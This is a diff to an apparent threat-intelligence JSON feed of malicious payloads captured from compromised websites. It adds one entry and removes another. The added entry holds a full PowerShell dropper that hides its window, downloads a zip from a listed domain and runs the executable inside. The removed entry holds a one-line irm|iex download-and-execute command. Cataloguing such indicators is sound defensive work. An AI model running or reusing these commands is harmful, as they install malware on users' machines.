@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "linuxbazar.com",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "77.37.53.251"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwqsnua328lm0omlqomd3emx",
+    "ScannedAt": "2026-11-21T19:21:46.825000+00:00"
+  },
+  {
     "UrlDomain": "jonettasmith.com",
     "DeliveryUrl": [
       "img-codes-cloude.info"
@@ -1352,24 +1371,5 @@
     "ResolvedDownloadUrl": [],
     "ReportId": "cmwpgskvn233b0omltqhzervg",
     "ScannedAt": "2026-11-20T21:01:46.365000+00:00"
-  },
-  {
-    "UrlDomain": "www.edmradio.es",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/3d49565511570d7b"
-    ],
-    "IP": [
-      "46.30.215.161"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/3d49565511570d7b')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/3d49565511570d7b"
-    ],
-    "ReportId": "cmwpddiwu23050omlwlpexkd6",
-    "ScannedAt": "2026-11-20T19:26:04.902000+00:00"
   }
 ]
